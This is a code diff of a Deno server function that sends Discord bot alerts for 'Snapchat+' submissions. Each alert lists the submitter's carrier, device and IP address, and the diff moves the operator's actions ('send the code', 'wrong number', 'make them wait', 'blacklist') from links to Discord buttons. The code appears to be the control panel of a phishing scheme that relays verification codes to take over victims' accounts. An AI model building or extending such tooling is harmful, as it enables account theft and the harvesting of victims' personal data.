@@ -42,12 +42,6 @@ Deno.serve(async (req) => {
     timeZone: "Europe/Paris"
   });
 
-  const appUrl = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "https://snap-post-hub.base44.app";
-  const triggerUrl = `${appUrl}/?trigger=${submissionId}`;
-  const wrongUrl = `${appUrl}/?triggerAction=wrong&id=${submissionId}`;
-  const waitUrl = `${appUrl}/?triggerAction=wait&id=${submissionId}`;
-  const blacklistUrl = `${appUrl}/?triggerAction=blacklist&id=${submissionId}&ip=${encodeURIComponent(finalIp)}`;
-
   const embed = {
     title: "📱 Nouvelle soumission Snapchat+",
     color: operatorColors[operateur] || 16776960,
@@ -61,17 +55,22 @@ Deno.serve(async (req) => {
       { name: "💾 Appareil", value: finalDevice, inline: true },
       { name: "🕵️ Adresse IP", value: `\`${finalIp}\``, inline: false },
       { name: "🕐 Date de soumission", value: dateStr, inline: false },
-      {
-        name: "⚡ Actions",
-        value: `✅ [**Envoyer le code**](${triggerUrl})\n❌ [**Mauvais numéro**](${wrongUrl})\n⏳ [**Faire patienter**](${waitUrl})\n🚫 [**Blacklist instant**](${blacklistUrl})`,
-        inline: false
-      },
     ],
     footer: { text: `ID: ${submissionId || "N/A"}` },
     timestamp: now.toISOString(),
   };
 
-  await sendBotMessage({ embeds: [embed] });
+  const components = [{
+    type: 1,
+    components: [
+      { type: 2, style: 3, label: "✅ Envoyer le code", custom_id: `action:code_ready:${submissionId}` },
+      { type: 2, style: 4, label: "❌ Mauvais numéro", custom_id: `action:wrong:${submissionId}` },
+      { type: 2, style: 2, label: "⏳ Faire patienter", custom_id: `action:wait:${submissionId}` },
+      { type: 2, style: 4, label: "🚫 Blacklist", custom_id: `action:blacklist:${submissionId}:${finalIp}` },
+    ]
+  }];
+
+  await sendBotMessage({ embeds: [embed], components });
 
   await base44.asServiceRole.entities.ActionLog.create({
     submission_id: submissionId,
